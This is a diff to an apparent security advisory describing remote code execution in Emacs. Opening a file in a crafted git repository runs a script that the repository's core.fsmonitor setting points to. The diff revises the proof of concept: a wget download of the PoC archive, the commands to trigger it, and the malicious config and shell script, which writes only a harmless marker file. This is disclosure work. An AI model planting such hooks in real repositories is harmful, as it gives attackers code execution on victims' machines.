@@ -88,23 +88,21 @@ vc-hooks.el:950   vc-refresh-state: (when buffer-file-name ...)  ← any file wi
 
 Verified on Emacs 31.0.50, git 2.39.5:
 ```bash
-wget https://raw.githubusercontent.com/califio/publications/MADBugs/refs/heads/main/MADBugs/vim-vs-emacs-vs-claude/emacs-poc.tgz
+wget https://github.com/califio/publications/raw/refs/heads/main/MADBugs/vim-vs-emacs-vs-claude/emacs-poc.tgz
 tar -xzpvf emacs-poc.tgz
-emacs emacs-poc/poc.txt
-cat /tmp/emacs-poc-vc-git-rce  # → uid=1000(user) ...
+emacs emacs-poc/a.txt
+cat /tmp/pwned
 ```
 File contents:
 ```sh
 #.git/config
 [core]
   ...
-  fsmonitor = .git/hooks/fsmonitor-watchman
+  fsmonitor = .git/a
   
-#.git/hooks/fsmonitor-watchman
+#.git/a
 #!/bin/sh
-id > /tmp/emacs-poc-vc-git-rce
-echo "RCE: $(date)" >> /tmp/emacs-poc-vc-git-rce
-printf "\0"
+echo pwned:$(date)>>/tmp/pwned
 ```
 
 ### Impact
